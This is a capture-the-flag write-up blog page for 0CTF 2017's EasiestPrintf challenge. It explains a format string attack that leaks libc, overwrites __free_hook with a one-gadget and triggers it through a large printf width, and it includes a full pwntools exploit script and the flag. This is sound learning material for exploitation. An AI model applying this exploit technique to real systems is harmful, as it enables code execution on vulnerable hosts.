@@ -1,0 +1,60 @@
+<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>0CTF 2017 Quals: EasiestPrintf (pwn 150) | Isaac's Blog</title><link rel="canonical" href="https://poning.me/2017/03/23/EasiestPrintf/"/><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives/" class="sidebar-nav-item">Archives</a><a href="/about/" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>0CTF 2017 Quals: EasiestPrintf (pwn 150)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2017-03-23</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/format-string/">format string</a>/<a class="post-tag-link" href="/tags/libc-hook/">libc hook</a>/<a class="post-tag-link" href="/tags/printf/">printf</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Warm UP! A traditional Format String Attack.<br>It’s running on Debian 8.<br>nc 202.120.7.210 12321<br><a href="/2017/03/23/EasiestPrintf/EasiestPrintf" title="EasiestPrintf">EasiestPrintf</a><br><a href="/2017/03/23/EasiestPrintf/libc.so.6_0ed9bad239c74870ed2db31c735132ce" title="libc.so.6">libc.so.6</a></p>
+</blockquote>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>Leak the libc address from the free arbitrary read.</li>
+<li>Use format string to modify <code>__free_hook</code> to the one-gadget and trigger it by a format placeholder with large width field.</li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>This is a simple binary. After some setup, it first gives us an arbitrary read and then a 159-byte format string vulnerability. The problem is that this is a Full RELRO binary, so we can not change the GOT value to hijack the control flow. Moreover, because the <code>printf</code> is immediately followed by an <code>_exit</code>, we have to exploit in a single format string.</p>
+<p>Several ideas come to my mind.</p>
+<ol>
+<li>Because it is a 32-bit binary, maybe we can brute force the return address of <code>printf</code>.</li>
+<li>Exploit the <code>exit</code> function, maybe something like <code>atexit</code> function pointer is exploitable.</li>
+<li>Change the value of <code>__malloc_hook</code> or <code>__free_hook</code> and find a way to trigger them in <code>printf</code>.</li>
+</ol>
+<p>For the first idea, the search space is large, and both the manual randomization of stack through <code>alloca</code> and <code>sleep(3)</code> at the beginning of the binary discourage this solution.</p>
+<p>For the second idea, <code>atexit</code> function pointers are encrypted, and this binary use <code>_exit</code> instead of <code>exit</code>, which won’t trigger <code>atexit</code> functions anyway.</p>
+<p>Finally, the third idea works out. By searching <code>malloc</code> in <code>vfprintf.c</code>, it seems that we can trigger <code>malloc</code> and the following <code>free</code> if the width field of the format placeholder is large enough.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br></pre></td><td class="code"><pre><span class="hljs-keyword">if</span> (width &gt;= WORK_BUFFER_SIZE - <span class="hljs-number">32</span>)<br>  &#123;<br>    <span class="hljs-keyword">size_t</span> needed = ((<span class="hljs-keyword">size_t</span>) width + <span class="hljs-number">32</span>) * <span class="hljs-keyword">sizeof</span> (CHAR_T);<br>    ...<br>    workstart = (CHAR_T *) <span class="hljs-built_in">malloc</span> (needed);<br></pre></td></tr></table></figure>
+<p>Although it took me quite a while to come up with the solution, the final exploitation is short and straightforward.</p>
+<ol>
+<li>Leak the libc address from the arbitrary read.</li>
+<li>Construct a format string with<ol>
+<li>the <code>%hhn</code> trick to modify <code>__free_hook</code> to the one-gadget.</li>
+<li><code>%100000c</code> to trigger <code>malloc</code> and <code>free</code>.</li>
+</ol>
+</li>
+</ol>
+<p>I choose <code>__free_hook</code> instead of <code>__malloc_hook</code> because the address of <code>__malloc_hook</code> contains a <code>\x0a</code> byte which will break the reading of the input.</p>
+<p>The full script is as follows.<br><figure class="highlight python"><figcaption><span>EasiestPrintf_exp.py</span><a href="/2017/03/23/EasiestPrintf/EasiestPrintf_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]<br>context.log_level = <span class="hljs-string">'critical'</span><br><br>libc = ELF(<span class="hljs-string">'./libc.so.6_0ed9bad239c74870ed2db31c735132ce'</span>)<br>binary = ELF(<span class="hljs-string">'./EasiestPrintf'</span>)<br>read_got = binary.symbols[<span class="hljs-string">'_GLOBAL_OFFSET_TABLE_'</span>] + <span class="hljs-number">12</span><br>libc.symbols[<span class="hljs-string">'one_gadget'</span>] = <span class="hljs-number">0x3E297</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exec_fmt</span><span class="hljs-params">(payload)</span>:</span><br>    p = binary.process(env={ <span class="hljs-string">'LD_PRELOAD'</span>: libc.path })<br>    p.sendline(str(read_got))<br>    p.recvuntil(<span class="hljs-string">'Good Bye\n'</span>)<br>    p.sendline(payload)<br>    <span class="hljs-keyword">return</span> p.recvall()<br><br>fmt = FmtStr(exec_fmt)<br>log.critical(<span class="hljs-string">'offset: '</span> + str(fmt.offset))<br><br><br><span class="hljs-comment"># r = binary.process(env={ 'LD_PRELOAD': libc.path })</span><br><span class="hljs-comment"># gdb.attach(r, '''</span><br><span class="hljs-comment"># c</span><br><span class="hljs-comment"># ''')</span><br>r = remote(<span class="hljs-string">'202.120.7.210'</span>, <span class="hljs-number">12321</span>)<br><br><span class="hljs-keyword">print</span> r.recvline()<br><br><span class="hljs-comment"># Leak the libc base address.</span><br>r.sendline(str(read_got))<br>data = r.recvline()<br><span class="hljs-keyword">print</span> data<br>read_addr = int(data, <span class="hljs-number">16</span>)<br>libc.address = read_addr - libc.symbols[<span class="hljs-string">'read'</span>]<br>log.critical(<span class="hljs-string">'libc_base: '</span> + hex(libc.address))<br>log.critical(<span class="hljs-string">'__free_hook: '</span> + hex(libc.symbols[<span class="hljs-string">'__free_hook'</span>]))<br>log.critical(<span class="hljs-string">'one gadget: '</span> + hex(libc.symbols[<span class="hljs-string">'one_gadget'</span>]))<br><br><span class="hljs-comment"># Use format string to override the value of __free_hook to one gadget and</span><br><span class="hljs-comment"># trigger free by a long width format string.</span><br><span class="hljs-keyword">print</span> r.recvline()<br>r.sendline(fmtstr_payload(fmt.offset, { libc.symbols[<span class="hljs-string">'__free_hook'</span>]: libc.symbols[<span class="hljs-string">'one_gadget'</span>] }) + <span class="hljs-string">'%100000c'</span>)<br>r.interactive()<br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>Flag: <code>flag{Dr4m471c_pr1N7f_45_y0u_Kn0w}</code></p>
+</blockquote>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><ul>
+<li><strong>What I’ve learned:</strong><ul>
+<li>Both <code>printf</code> and <code>scanf</code> can trigger <code>malloc</code> and <code>free</code>.</li>
+</ul>
+</li>
+<li>There are couples of solutions for this challenge. See <a href="https://www.youtube.com/watch?v=kEqOvWmzu6Y" target="_blank" rel="external">this video</a> for more details.</li>
+</ul>
+</div><!-- comment system--><div class="container"><hr><div id="disqus_thread"></div><script type="text/javascript">
+var disqus_shortname = 'poning';
+var disqus_identifier = '2017/03/23/EasiestPrintf/';
+var disqus_title = '0CTF 2017 Quals: EasiestPrintf (pwn 150)';
+var disqus_url = 'https://poning.me/2017/03/23/EasiestPrintf/';
+(function() {
+   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">Blog comments powered by <span class="logo-disqus">Disqus</span></a></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2017 <a href="/" rel="nofollow">Isaac Tseng</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
+    $(".fancybox").fancybox();
+});
+</script></body><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
+function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
+e=o.createElement(i);r=o.getElementsByTagName(i)[0];
+e.src='//www.google-analytics.com/analytics.js';
+r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
+ga('create','UA-86477289-1');ga('send','pageview');</script></html>
